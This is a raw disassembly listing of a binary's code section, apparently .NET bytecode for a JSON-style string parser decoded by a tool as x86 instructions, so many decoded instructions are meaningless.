  40460d:	00 01                	add    %al,(%ecx)
  40460f:	25 16 72 3d 03       	and    $0x33d7216,%eax
  404614:	00 70 a2             	add    %dh,-0x5e(%eax)
  404617:	25 17 0f 00 28       	and    $0x28000f17,%eax
  40461c:	88 00                	mov    %al,(%eax)
  40461e:	00 0a                	add    %cl,(%edx)
  404620:	a2 25 18 72 b1       	mov    %al,0xb1721825
  404625:	03 00                	add    (%eax),%eax
  404627:	70 a2                	jo     0x4045cb
  404629:	25 19 0f 01 28       	and    $0x28010f19,%eax
  40462e:	87 00                	xchg   %eax,(%eax)
  404630:	00 0a                	add    %cl,(%edx)
  404632:	a2 25 1a 72 23       	mov    %al,0x23721a25
  404637:	03 00                	add    (%eax),%eax
  404639:	70 a2                	jo     0x4045dd
  40463b:	28 89 00 00 0a 73    	sub    %cl,0x730a0000(%ecx)
  404641:	30 01                	xor    %al,(%ecx)
  404643:	00 06                	add    %al,(%esi)
  404645:	2a 00                	sub    (%eax),%al
  404647:	00 13                	add    %dl,(%ebx)
  404649:	30 04 00             	xor    %al,(%eax,%eax,1)
  40464c:	5e                   	pop    %esi
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 00                	add    %al,(%eax)
  404651:	00 00                	add    %al,(%eax)
  404653:	00 02                	add    %al,(%edx)
  404655:	16                   	push   %ss
  404656:	6a 2f                	push   $0x2f
  404658:	1c 72                	sbb    $0x72,%al
  40465a:	cd 03                	int    $0x3
  40465c:	00 70 0f             	add    %dh,0xf(%eax)
  40465f:	01 28                	add    %ebp,(%eax)
  404661:	87 00                	xchg   %eax,(%eax)
  404663:	00 0a                	add    %cl,(%edx)
  404665:	72 23                	jb     0x40468a
  404667:	03 00                	add    (%eax),%eax
  404669:	70 28                	jo     0x404693
  40466b:	5b                   	pop    %ebx
  40466c:	00 00                	add    %al,(%eax)
  40466e:	0a 73 30             	or     0x30(%ebx),%dh
  404671:	01 00                	add    %eax,(%eax)
  404673:	06                   	push   %es
  404674:	2a 1b                	sub    (%ebx),%bl
  404676:	8d 55 00             	lea    0x0(%ebp),%edx
  404679:	00 01                	add    %al,(%ecx)
  40467b:	25 16 72 43 04       	and    $0x4437216,%eax
  404680:	00 70 a2             	add    %dh,-0x5e(%eax)
  404683:	25 17 0f 00 28       	and    $0x28000f17,%eax
  404688:	88 00                	mov    %al,(%eax)
  40468a:	00 0a                	add    %cl,(%edx)
  40468c:	a2 25 18 72 b7       	mov    %al,0xb7721825
  404691:	04 00                	add    $0x0,%al
  404693:	70 a2                	jo     0x404637
  404695:	25 19 0f 01 28       	and    $0x28010f19,%eax
  40469a:	87 00                	xchg   %eax,(%eax)
  40469c:	00 0a                	add    %cl,(%edx)
  40469e:	a2 25 1a 72 23       	mov    %al,0x23721a25
  4046a3:	03 00                	add    (%eax),%eax
  4046a5:	70 a2                	jo     0x404649
  4046a7:	28 89 00 00 0a 73    	sub    %cl,0x730a0000(%ecx)
  4046ad:	30 01                	xor    %al,(%ecx)
  4046af:	00 06                	add    %al,(%esi)
  4046b1:	2a 00                	sub    (%eax),%al
  4046b3:	00 13                	add    %dl,(%ebx)
  4046b5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4046b8:	54                   	push   %esp
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 00                	add    %al,(%eax)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	00 02                	add    %al,(%edx)
  4046c1:	16                   	push   %ss
  4046c2:	6a 2f                	push   $0x2f
  4046c4:	17                   	pop    %ss
  4046c5:	72 2e                	jb     0x4046f5
  4046c7:	06                   	push   %es
  4046c8:	00 70 03             	add    %dh,0x3(%eax)
  4046cb:	72 32                	jb     0x4046ff
  4046cd:	01 00                	add    %eax,(%eax)
  4046cf:	70 28                	jo     0x4046f9
  4046d1:	5b                   	pop    %ebx
  4046d2:	00 00                	add    %al,(%eax)
  4046d4:	0a 04 73             	or     (%ebx,%esi,2),%al
  4046d7:	31 01                	xor    %eax,(%ecx)
  4046d9:	00 06                	add    %al,(%esi)
  4046db:	2a 1b                	sub    (%ebx),%bl
  4046dd:	8d 55 00             	lea    0x0(%ebp),%edx
  4046e0:	00 01                	add    %al,(%ecx)
  4046e2:	25 16 72 94 06       	and    $0x6947216,%eax
  4046e7:	00 70 a2             	add    %dh,-0x5e(%eax)
  4046ea:	25 17 03 a2 25       	and    $0x25a20317,%eax
  4046ef:	18 72 fa             	sbb    %dh,-0x6(%edx)
  4046f2:	06                   	push   %es
  4046f3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4046f6:	25 19 0f 00 28       	and    $0x28000f19,%eax
  4046fb:	88 00                	mov    %al,(%eax)
  4046fd:	00 0a                	add    %cl,(%edx)
  4046ff:	a2 25 1a 72 22       	mov    %al,0x22721a25
  404704:	07                   	pop    %es
  404705:	00 70 a2             	add    %dh,-0x5e(%eax)
  404708:	28 89 00 00 0a 04    	sub    %cl,0x40a0000(%ecx)
  40470e:	73 31                	jae    0x404741
  404710:	01 00                	add    %eax,(%eax)
  404712:	06                   	push   %es
  404713:	2a 1b                	sub    (%ebx),%bl
  404715:	30 03                	xor    %al,(%ebx)
  404717:	00 69 00             	add    %ch,0x0(%ecx)
  40471a:	00 00                	add    %al,(%eax)
  40471c:	19 00                	sbb    %eax,(%eax)
  40471e:	00 11                	add    %dl,(%ecx)
  404720:	02 2d 03 15 6a 2a    	add    0x2a6a1503,%ch
  404726:	02 75 69             	add    0x69(%ebp),%dh
  404729:	00 00                	add    %al,(%eax)
  40472b:	01 0a                	add    %ecx,(%edx)
  40472d:	06                   	push   %es
  40472e:	2c 1c                	sub    $0x1c,%al
  404730:	06                   	push   %es
  404731:	6f                   	outsl  %ds:(%esi),(%dx)
  404732:	8a 00                	mov    (%eax),%al
  404734:	00 0a                	add    %cl,(%edx)
  404736:	2c 14                	sub    $0x14,%al
  404738:	06                   	push   %es
  404739:	6f                   	outsl  %ds:(%esi),(%dx)
  40473a:	8a 00                	mov    (%eax),%al
  40473c:	00 0a                	add    %cl,(%edx)
  40473e:	6f                   	outsl  %ds:(%esi),(%dx)
  40473f:	8b 00                	mov    (%eax),%eax
  404741:	00 0a                	add    %cl,(%edx)
  404743:	0c de                	or     $0xde,%al
  404745:	41                   	inc    %ecx
  404746:	26 15 6a 0c de 3b    	es adc $0x3bde0c6a,%eax
  40474c:	02 75 5c             	add    0x5c(%ebp),%dh
  40474f:	00 00                	add    %al,(%eax)
  404751:	01 0b                	add    %ecx,(%ebx)
  404753:	07                   	pop    %es
  404754:	2c 2e                	sub    $0x2e,%al
  404756:	d0 5c 00 00          	rcrb   $1,0x0(%eax,%eax,1)
  40475a:	01 28                	add    %ebp,(%eax)
  40475c:	3c 00                	cmp    $0x0,%al
  40475e:	00 0a                	add    %cl,(%edx)
  404760:	72 b9                	jb     0x40471b
  404762:	07                   	pop    %es
  404763:	00 70 1f             	add    %dh,0x1f(%eax)
  404766:	24 6f                	and    $0x6f,%al
  404768:	8c 00                	mov    %es,(%eax)
  40476a:	00 0a                	add    %cl,(%edx)
  40476c:	0d 09 14 28 8d       	or     $0x8d281409,%eax
  404771:	00 00                	add    %al,(%eax)
  404773:	0a 2c 0e             	or     (%esi,%ecx,1),%ch
  404776:	09 07                	or     %eax,(%edi)
  404778:	6f                   	outsl  %ds:(%esi),(%dx)
  404779:	8e 00                	mov    (%eax),%es
  40477b:	00 0a                	add    %cl,(%edx)
  40477d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40477e:	5d                   	pop    %ebp
  40477f:	00 00                	add    %al,(%eax)
  404781:	01 6a 2a             	add    %ebp,0x2a(%edx)
  404784:	15 6a 2a 08 2a       	adc    $0x2a082a6a,%eax
  404789:	00 00                	add    %al,(%eax)
  40478b:	00 01                	add    %al,(%ecx)
  40478d:	10 00                	adc    %al,(%eax)
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 18                	add    %bl,(%eax)
  404793:	00 0e                	add    %cl,(%esi)
  404795:	26 00 06             	add    %al,%es:(%esi)
  404798:	02 00                	add    (%eax),%al
  40479a:	00 01                	add    %al,(%ecx)
  40479c:	13 30                	adc    (%eax),%esi
  40479e:	04 00                	add    $0x0,%al
  4047a0:	e6 00                	out    %al,$0x0
  4047a2:	00 00                	add    %al,(%eax)
  4047a4:	1a 00                	sbb    (%eax),%al
  4047a6:	00 11                	add    %dl,(%ecx)
  4047a8:	02 28                	add    (%eax),%ch
  4047aa:	33 00                	xor    (%eax),%eax
  4047ac:	00 06                	add    %al,(%esi)
  4047ae:	2d 02 14 2a 02       	sub    $0x22a1402,%eax
  4047b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b4:	84 00                	test   %al,(%eax)
  4047b6:	00 0a                	add    %cl,(%edx)
  4047b8:	26 73 8f             	es jae 0x40474a
  4047bb:	00 00                	add    %al,(%eax)
  4047bd:	0a 0a                	or     (%edx),%cl
  4047bf:	02 6f 86             	add    -0x7a(%edi),%ch
  4047c2:	00 00                	add    %al,(%eax)
  4047c4:	0a 16                	or     (%esi),%dl
  4047c6:	2f                   	das
  4047c7:	0f 1f 7d 28          	nopl   0x28(%ebp)
  4047cb:	23 00                	and    (%eax),%eax
  4047cd:	00 06                	add    %al,(%esi)
  4047cf:	03 28                	add    (%eax),%ebp
  4047d1:	30 00                	xor    %al,(%eax)
  4047d3:	00 06                	add    %al,(%esi)
  4047d5:	06                   	push   %es
  4047d6:	2a 02                	sub    (%edx),%al
  4047d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d9:	84 00                	test   %al,(%eax)
  4047db:	00 0a                	add    %cl,(%edx)
  4047dd:	d1 0b                	rorl   $1,(%ebx)
  4047df:	07                   	pop    %es
  4047e0:	1f                   	pop    %ds
  4047e1:	20 35 24 07 1f 09    	and    %dh,0x91f0724
  4047e7:	59                   	pop    %ecx
  4047e8:	45                   	inc    %ebp
  4047e9:	05 00 00 00 be       	add    $0xbe000000,%eax
  4047ee:	ff                   	(bad)
  4047ef:	ff                   	(bad)
  4047f0:	ff                   	(bad)
  4047f1:	be ff ff ff 79       	mov    $0x79ffffff,%esi
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	00 79 00             	add    %bh,0x0(%ecx)
  4047fb:	00 00                	add    %al,(%eax)
  4047fd:	be ff ff ff 07       	mov    $0x7ffffff,%esi
  404802:	1f                   	pop    %ds
  404803:	20 2e                	and    %ch,(%esi)
  404805:	b9 2b 72 07 1f       	mov    $0x1f07722b,%ecx
  40480a:	22 2e                	and    (%esi),%ch
  40480c:	0c 07                	or     $0x7,%al
  40480e:	1f                   	pop    %ds
  40480f:	2c 2e                	sub    $0x2e,%al
  404811:	ad                   	lods   %ds:(%esi),%eax
  404812:	07                   	pop    %es
  404813:	1f                   	pop    %ds
  404814:	7d 33                	jge    0x404849
  404816:	63 06                	arpl   %eax,(%esi)
  404818:	2a 02                	sub    (%edx),%al
  40481a:	03 28                	add    (%eax),%ebp
  40481c:	26 00 00             	add    %al,%es:(%eax)
  40481f:	06                   	push   %es
  404820:	0c 02                	or     $0x2,%al
  404822:	28 33                	sub    %dh,(%ebx)
  404824:	00 00                	add    %al,(%eax)
  404826:	06                   	push   %es
  404827:	2d 15 02 28 24       	sub    $0x24280215,%eax
  40482c:	00 00                	add    %al,(%eax)
  40482e:	06                   	push   %es
  40482f:	1f                   	pop    %ds
  404830:	3a 28                	cmp    (%eax),%ch
  404832:	1f                   	pop    %ds
  404833:	00 00                	add    %al,(%eax)
  404835:	06                   	push   %es
  404836:	03 28                	add    (%eax),%ebp
  404838:	30 00                	xor    %al,(%eax)
  40483a:	00 06                	add    %al,(%esi)
  40483c:	06                   	push   %es
  40483d:	2a 02                	sub    (%edx),%al
  40483f:	6f                   	outsl  %ds:(%esi),(%dx)
  404840:	86 00                	xchg   %al,(%eax)
  404842:	00 0a                	add    %cl,(%edx)
  404844:	d1 0b                	rorl   $1,(%ebx)
  404846:	07                   	pop    %es
  404847:	1f                   	pop    %ds
  404848:	3a 2e                	cmp    (%esi),%ch
  40484a:	15 02 28 24 00       	adc    $0x242802,%eax
  40484f:	00 06                	add    %al,(%esi)
  404851:	1f                   	pop    %ds
  404852:	3a 28                	cmp    (%eax),%ch
  404854:	1f                   	pop    %ds
  404855:	00 00                	add    %al,(%eax)
  404857:	06                   	push   %es
  404858:	03 28                	add    (%eax),%ebp
  40485a:	30 00                	xor    %al,(%eax)
  40485c:	00 06                	add    %al,(%esi)
  40485e:	06                   	push   %es
  40485f:	2a 02                	sub    (%edx),%al
  404861:	6f                   	outsl  %ds:(%esi),(%dx)
  404862:	84 00                	test   %al,(%eax)
  404864:	00 0a                	add    %cl,(%edx)
  404866:	26 06                	es push %es
  404868:	08 02                	or     %al,(%edx)
  40486a:	03 28                	add    (%eax),%ebp
  40486c:	28 00                	sub    %al,(%eax)
  40486e:	00 06                	add    %al,(%esi)
  404870:	6f                   	outsl  %ds:(%esi),(%dx)
  404871:	90                   	nop
  404872:	00 00                	add    %al,(%eax)
  404874:	0a 38                	or     (%eax),%bh
  404876:	45                   	inc    %ebp
  404877:	ff                   	(bad)
  404878:	ff                   	(bad)
  404879:	ff 02                	incl   (%edx)
  40487b:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40487e:	00 06                	add    %al,(%esi)
  404880:	07                   	pop    %es
  404881:	28 20                	sub    %ah,(%eax)
  404883:	00 00                	add    %al,(%eax)
  404885:	06                   	push   %es
  404886:	03 28                	add    (%eax),%ebp
  404888:	30 00                	xor    %al,(%eax)
  40488a:	00 06                	add    %al,(%esi)
  40488c:	06                   	push   %es
  40488d:	2a 00                	sub    (%eax),%al
  40488f:	00 13                	add    %dl,(%ebx)
  404891:	30 02                	xor    %al,(%edx)
  404893:	00 39                	add    %bh,(%ecx)
  404895:	01 00                	add    %eax,(%eax)
  404897:	00 1b                	add    %bl,(%ebx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	11 73 91             	adc    %esi,-0x6f(%ebx)
  40489e:	00 00                	add    %al,(%eax)
  4048a0:	0a 0a                	or     (%edx),%cl
  4048a2:	02 6f 86             	add    -0x7a(%edi),%ch
  4048a5:	00 00                	add    %al,(%eax)
  4048a7:	0a 16                	or     (%esi),%dl
  4048a9:	2f                   	das
  4048aa:	0f 1f 22             	nopl   (%edx)
  4048ad:	28 23                	sub    %ah,(%ebx)
  4048af:	00 00                	add    %al,(%eax)
  4048b1:	06                   	push   %es
  4048b2:	03 28                	add    (%eax),%ebp
  4048b4:	30 00                	xor    %al,(%eax)
  4048b6:	00 06                	add    %al,(%esi)
  4048b8:	14 2a                	adc    $0x2a,%al
  4048ba:	02 6f 84             	add    -0x7c(%edi),%ch
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	0a d1                	or     %cl,%dl
  4048c1:	0b 07                	or     (%edi),%eax
  4048c3:	1f                   	pop    %ds
  4048c4:	22 3b                	and    (%ebx),%bh
  4048c6:	04 01                	add    $0x1,%al
  4048c8:	00 00                	add    %al,(%eax)
  4048ca:	07                   	pop    %es
  4048cb:	1f                   	pop    %ds
  4048cc:	5c                   	pop    %esp
  4048cd:	40                   	inc    %eax
  4048ce:	ef                   	out    %eax,(%dx)
  4048cf:	00 00                	add    %al,(%eax)
  4048d1:	00 02                	add    %al,(%edx)
  4048d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4048d4:	86 00                	xchg   %al,(%eax)
  4048d6:	00 0a                	add    %cl,(%edx)
  4048d8:	16                   	push   %ss
  4048d9:	2f                   	das
  4048da:	0f 1f 22             	nopl   (%edx)
  4048dd:	28 23                	sub    %ah,(%ebx)
  4048df:	00 00                	add    %al,(%eax)
  4048e1:	06                   	push   %es
  4048e2:	03 28                	add    (%eax),%ebp
  4048e4:	30 00                	xor    %al,(%eax)
  4048e6:	00 06                	add    %al,(%esi)
  4048e8:	14 2a                	adc    $0x2a,%al
  4048ea:	02 6f 84             	add    -0x7c(%edi),%ch
  4048ed:	00 00                	add    %al,(%eax)
  4048ef:	0a d1                	or     %cl,%dl
  4048f1:	0c 08                	or     $0x8,%al
  4048f3:	1f                   	pop    %ds
  4048f4:	5c                   	pop    %esp
  4048f5:	35 1a 08 1f 22       	xor    $0x221f081a,%eax
  4048fa:	3b 8b 00 00 00 08    	cmp    0x8000000(%ebx),%ecx
  404900:	1f                   	pop    %ds
  404901:	2f                   	das
  404902:	3b 83 00 00 00 08    	cmp    0x8000000(%ebx),%eax
  404908:	1f                   	pop    %ds
  404909:	5c                   	pop    %esp
  40490a:	2e 7e 38             	jle,pn 0x404945
  40490d:	9b                   	fwait
  40490e:	00 00                	add    %al,(%eax)
  404910:	00 08                	add    %cl,(%eax)
  404912:	1f                   	pop    %ds
  404913:	66 35 0f 08          	xor    $0x80f,%ax
  404917:	1f                   	pop    %ds
  404918:	62 2e                	bound  %ebp,(%esi)
  40491a:	2a 08                	sub    (%eax),%cl
  40491c:	1f                   	pop    %ds
  40491d:	66 2e 4e             	cs dec %si
  404920:	38 87 00 00 00 08    	cmp    %al,0x8000000(%edi)
  404926:	1f                   	pop    %ds
  404927:	6e                   	outsb  %ds:(%esi),(%dx)
  404928:	2e 36 08 1f          	cs or  %bl,%ss:(%edi)
  40492c:	72 59                	jb     0x404987
  40492e:	45                   	inc    %ebp
  40492f:	04 00                	add    $0x0,%al
  404931:	00 00                	add    %al,(%eax)
  404933:	39 00                	cmp    %eax,(%eax)
  404935:	00 00                	add    %al,(%eax)
  404937:	69 00 00 00 0f 00    	imul   $0xf0000,(%eax),%eax
  40493d:	00 00                	add    %al,(%eax)
  40493f:	54                   	push   %esp
  404940:	00 00                	add    %al,(%eax)
  404942:	00 2b                	add    %ch,(%ebx)
  404944:	67 06                	addr16 push %es
  404946:	1e                   	push   %ds
  404947:	6f                   	outsl  %ds:(%esi),(%dx)
  404948:	92                   	xchg   %eax,%edx
  404949:	00 00                	add    %al,(%eax)
  40494b:	0a 26                	or     (%esi),%ah
  40494d:	38 50 ff             	cmp    %dl,-0x1(%eax)
  404950:	ff                   	(bad)
  404951:	ff 06                	incl   (%esi)
  404953:	1f                   	pop    %ds
  404954:	09 6f 92             	or     %ebp,-0x6e(%edi)
  404957:	00 00                	add    %al,(%eax)
  404959:	0a 26                	or     (%esi),%ah
  40495b:	38 42 ff             	cmp    %al,-0x1(%edx)
  40495e:	ff                   	(bad)
  40495f:	ff 06                	incl   (%esi)
  404961:	1f                   	pop    %ds
  404962:	0a 6f 92             	or     -0x6e(%edi),%ch
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 26                	or     (%esi),%ah
  404969:	38 34 ff             	cmp    %dh,(%edi,%edi,8)
  40496c:	ff                   	(bad)
  40496d:	ff 06                	incl   (%esi)
  40496f:	1f                   	pop    %ds
  404970:	0c 6f                	or     $0x6f,%al
  404972:	92                   	xchg   %eax,%edx
  404973:	00 00                	add    %al,(%eax)
  404975:	0a 26                	or     (%esi),%ah
  404977:	38 26                	cmp    %ah,(%esi)
  404979:	ff                   	(bad)
  40497a:	ff                   	(bad)
  40497b:	ff 06                	incl   (%esi)
  40497d:	1f                   	pop    %ds
  40497e:	0d 6f 92 00 00       	or     $0x926f,%eax
  404983:	0a 26                	or     (%esi),%ah
  404985:	38 18                	cmp    %bl,(%eax)
  404987:	ff                   	(bad)
  404988:	ff                   	(bad)
  404989:	ff 06                	incl   (%esi)
  40498b:	08 6f 92             	or     %ch,-0x6e(%edi)
  40498e:	00 00                	add    %al,(%eax)
  404990:	0a 26                	or     (%esi),%ah
  404992:	38 0b                	cmp    %cl,(%ebx)
  404994:	ff                   	(bad)
  404995:	ff                   	(bad)
  404996:	ff 02                	incl   (%edx)
  404998:	03 28                	add    (%eax),%ebp
  40499a:	32 00                	xor    (%eax),%al
  40499c:	00 06                	add    %al,(%esi)
  40499e:	0d 06 09 6f 92       	or     $0x926f0906,%eax
  4049a3:	00 00                	add    %al,(%eax)
  4049a5:	0a 26                	or     (%esi),%ah
  4049a7:	38 f6                	cmp    %dh,%dh
  4049a9:	fe                   	(bad)
  4049aa:	ff                   	(bad)
  4049ab:	ff 06                	incl   (%esi)
  4049ad:	07                   	pop    %es
  4049ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4049af:	92                   	xchg   %eax,%edx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	0a 26                	or     (%esi),%ah
  4049b4:	06                   	push   %es
  4049b5:	08 6f 92             	or     %ch,-0x6e(%edi)
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	0a 26                	or     (%esi),%ah
  4049bc:	38 e1                	cmp    %ah,%cl
  4049be:	fe                   	(bad)
  4049bf:	ff                   	(bad)
  4049c0:	ff 06                	incl   (%esi)
  4049c2:	07                   	pop    %es
  4049c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4049c4:	92                   	xchg   %eax,%edx
  4049c5:	00 00                	add    %al,(%eax)
  4049c7:	0a 26                	or     (%esi),%ah
  4049c9:	38 d4                	cmp    %dl,%ah
  4049cb:	fe                   	(bad)
  4049cc:	ff                   	(bad)
  4049cd:	ff 06                	incl   (%esi)
  4049cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4049d0:	02 00                	add    (%eax),%al
  4049d2:	00 0a                	add    %cl,(%edx)
  4049d4:	2a 00                	sub    (%eax),%al
  4049d6:	00 00                	add    %al,(%eax)
  4049d8:	1b 30                	sbb    (%eax),%esi
  4049da:	07                   	pop    %es
  4049db:	00 e9                	add    %ch,%cl
  4049dd:	00 00                	add    %al,(%eax)
  4049df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4049e2:	00 11                	add    %dl,(%ecx)
  4049e4:	04 17                	add    $0x17,%al
  4049e6:	28 93 00 00 0a 0a    	sub    %dl,0xa0a0000(%ebx)
  4049ec:	de 1e                	ficomps (%esi)
  4049ee:	13 04 02             	adc    (%edx,%eax,1),%eax
  4049f1:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4049f4:	00 06                	add    %al,(%esi)
  4049f6:	04 11                	add    $0x11,%al
  4049f8:	04 28                	add    $0x28,%al
  4049fa:	22 00                	and    (%eax),%al
  4049fc:	00 06                	add    %al,(%esi)
  4049fe:	03 28                	add    (%eax),%ebp
  404a00:	30 00                	xor    %al,(%eax)
  404a02:	00 06                	add    %al,(%esi)
  404a04:	14 13                	adc    $0x13,%al
  404a06:	05 dd be 00 00       	add    $0xbedd,%eax
  404a0b:	00 06                	add    %al,(%esi)
  404a0d:	1f                   	pop    %ds
  404a0e:	34 14                	xor    $0x14,%al
  404a10:	18 8d 06 00 00 01    	sbb    %cl,0x1000006(%ebp)
  404a16:	25 16 d0 2e 00       	and    $0x2ed016,%eax
  404a1b:	00 01                	add    %al,(%ecx)
  404a1d:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  404a20:	00 0a                	add    %cl,(%edx)
  404a22:	a2 25 17 d0 2f       	mov    %al,0x2fd01725
  404a27:	00 00                	add    %al,(%eax)
  404a29:	01 28                	add    %ebp,(%eax)
  404a2b:	3c 00                	cmp    $0x0,%al
  404a2d:	00 0a                	add    %cl,(%edx)
  404a2f:	a2 14 6f 94 00       	mov    %al,0x946f14
  404a34:	00 0a                	add    %cl,(%edx)
  404a36:	0b 06                	or     (%esi),%eax
  404a38:	7e 14                	jle    0x404a4e
  404a3a:	00 00                	add    %al,(%eax)
  404a3c:	04 73                	add    $0x73,%al
  404a3e:	95                   	xchg   %eax,%ebp
  404a3f:	00 00                	add    %al,(%eax)
  404a41:	0a 0c 05 6f 96 00 00 	or     0x966f(,%eax,1),%cl
  404a48:	0a 13                	or     (%ebx),%dl
  404a4a:	06                   	push   %es
  404a4b:	2b 1d 12 06 28 97    	sub    0x97280612,%ebx
  404a51:	00 00                	add    %al,(%eax)
  404a53:	0a 13                	or     (%ebx),%dl
  404a55:	07                   	pop    %es
  404a56:	08 12                	or     %dl,(%edx)
  404a58:	07                   	pop    %es
  404a59:	28 98 00 00 0a 12    	sub    %bl,0x120a0000(%eax)
  404a5f:	07                   	pop    %es
  404a60:	28 99 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ecx)
  404a66:	9a 00 00 0a 12 06 28 	lcall  $0x2806,$0x120a0000
  404a6d:	9b                   	fwait
  404a6e:	00 00                	add    %al,(%eax)
  404a70:	0a 2d da de 0e 12    	or     0x120ededa,%ch
  404a76:	06                   	push   %es
  404a77:	fe                   	(bad)
  404a78:	16                   	push   %ss
  404a79:	0f 00 00             	sldt   (%eax)
  404a7c:	1b 6f 19             	sbb    0x19(%edi),%ebp
  404a7f:	00 00                	add    %al,(%eax)
  404a81:	0a dc                	or     %ah,%bl
  404a83:	12 03                	adc    (%ebx),%al
  404a85:	1f                   	pop    %ds
  404a86:	10 14 28             	adc    %dl,(%eax,%ebp,1)
  404a89:	9c                   	pushf
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	0a 07                	or     (%edi),%al
  404a8e:	18 8d 02 00 00 01    	sbb    %cl,0x1000002(%ebp)
  404a94:	25 16 08 a2 25       	and    $0x25a20816,%eax
  404a99:	17                   	pop    %ss
  404a9a:	09 8c 2f 00 00 01 a2 	or     %ecx,-0x5dff0000(%edi,%ebp,1)
  404aa1:	6f                   	outsl  %ds:(%esi),(%dx)
  404aa2:	9d                   	popf
  404aa3:	00 00                	add    %al,(%eax)
  404aa5:	0a 74 10 00          	or     0x0(%eax,%edx,1),%dh
  404aa9:	00 01                	add    %al,(%ecx)
  404aab:	13 05 de 1b 13 08    	adc    0x8131bde,%eax
  404ab1:	02 28                	add    (%eax),%ch
  404ab3:	24 00                	and    $0x0,%al
  404ab5:	00 06                	add    %al,(%esi)
  404ab7:	04 11                	add    $0x11,%al
  404ab9:	08 28                	or     %ch,(%eax)
  404abb:	22 00                	and    (%eax),%al
  404abd:	00 06                	add    %al,(%esi)
  404abf:	03 28                	add    (%eax),%ebp
  404ac1:	30 00                	xor    %al,(%eax)
  404ac3:	00 06                	add    %al,(%esi)
  404ac5:	14 13                	adc    $0x13,%al
  404ac7:	05 de 00 11 05       	add    $0x51100de,%eax
  404acc:	2a 00                	sub    (%eax),%al
  404ace:	00 00                	add    %al,(%eax)
  404ad0:	01 28                	add    %ebp,(%eax)
  404ad2:	00 00                	add    %al,(%eax)
  404ad4:	00 00                	add    %al,(%eax)
  404ad6:	00 00                	add    %al,(%eax)
  404ad8:	0a 0a                	or     (%edx),%cl
  404ada:	00 1e                	add    %bl,(%esi)
  404adc:	0e                   	push   %cs
  404add:	00 00                	add    %al,(%eax)
  404adf:	01 02                	add    %eax,(%edx)
  404ae1:	00 67 00             	add    %ah,0x0(%edi)
  404ae4:	2a 91 00 0e 00 00    	sub    0xe00(%ecx),%dl
  404aea:	00 00                	add    %al,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	a9 00 22 cb 00       	test   $0xcb2200,%eax
  404af3:	1b 0e                	sbb    (%esi),%ecx
  404af5:	00 00                	add    %al,(%eax)
  404af7:	01 13                	add    %edx,(%ebx)
  404af9:	30 04 00             	xor    %al,(%eax,%eax,1)
  404afc:	0b 00                	or     (%eax),%eax
  404afe:	00 00                	add    %al,(%eax)
  404b00:	1d 00 00 11 02       	sbb    $0x2110000,%eax
  404b05:	03 16                	add    (%esi),%edx
  404b07:	12 00                	adc    (%eax),%al
  404b09:	28 29                	sub    %ch,(%ecx)
  404b0b:	00 00                	add    %al,(%eax)
  404b0d:	06                   	push   %es
  404b0e:	2a 00                	sub    (%eax),%al
  404b10:	13 30                	adc    (%eax),%esi
  404b12:	06                   	push   %es
  404b13:	00 6d 01             	add    %ch,0x1(%ebp)
  404b16:	00 00                	add    %al,(%eax)
  404b18:	1e                   	push   %ds
  404b19:	00 00                	add    %al,(%eax)
  404b1b:	11 05 16 52 02 6f    	adc    %eax,0x6f025216
  404b21:	86 00                	xchg   %al,(%eax)
  404b23:	00 0a                	add    %cl,(%edx)
  404b25:	0a 06                	or     (%esi),%al
  404b27:	16                   	push   %ss
  404b28:	2f                   	das
  404b29:	02 14 2a             	add    (%edx,%ebp,1),%dl
  404b2c:	06                   	push   %es
  404b2d:	1f                   	pop    %ds
  404b2e:	0a 2e                	or     (%esi),%ch
  404b30:	0f 06                	clts
  404b32:	1f                   	pop    %ds
  404b33:	0d 2e 0a 06 1f       	or     $0x1f060a2e,%eax
  404b38:	09 2e                	or     %ebp,(%esi)
  404b3a:	05 06 1f 20 33       	add    $0x33201f06,%eax
  404b3f:	09 02                	or     %eax,(%edx)
  404b41:	6f                   	outsl  %ds:(%esi),(%dx)
  404b42:	84 00                	test   %al,(%eax)
  404b44:	00 0a                	add    %cl,(%edx)
  404b46:	26 2b d6             	es sub %esi,%edx
  404b49:	06                   	push   %es
  404b4a:	d1 0b                	rorl   $1,(%ebx)
  404b4c:	07                   	pop    %es
  404b4d:	1f                   	pop    %ds
  404b4e:	22 33                	and    (%ebx),%dh
  404b50:	44                   	inc    %esp
  404b51:	02 6f 84             	add    -0x7c(%edi),%ch
  404b54:	00 00                	add    %al,(%eax)
  404b56:	0a 26                	or     (%esi),%ah
  404b58:	02 03                	add    (%ebx),%al
  404b5a:	28 26                	sub    %ah,(%esi)
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	06                   	push   %es
  404b5f:	0c 03                	or     $0x3,%al
  404b61:	6f                   	outsl  %ds:(%esi),(%dx)
  404b62:	f8                   	clc
  404b63:	00 00                	add    %al,(%eax)
  404b65:	06                   	push   %es
  404b66:	8c 1b                	mov    %ds,(%ebx)
  404b68:	00 00                	add    %al,(%eax)
  404b6a:	02 20                	add    (%eax),%ah
  404b6c:	00 80 00 00 8c 1b    	add    %al,0x1b8c0000(%eax)
  404b72:	00 00                	add    %al,(%eax)
  404b74:	02 28                	add    (%eax),%ch
  404b76:	80 00 00             	addb   $0x0,(%eax)
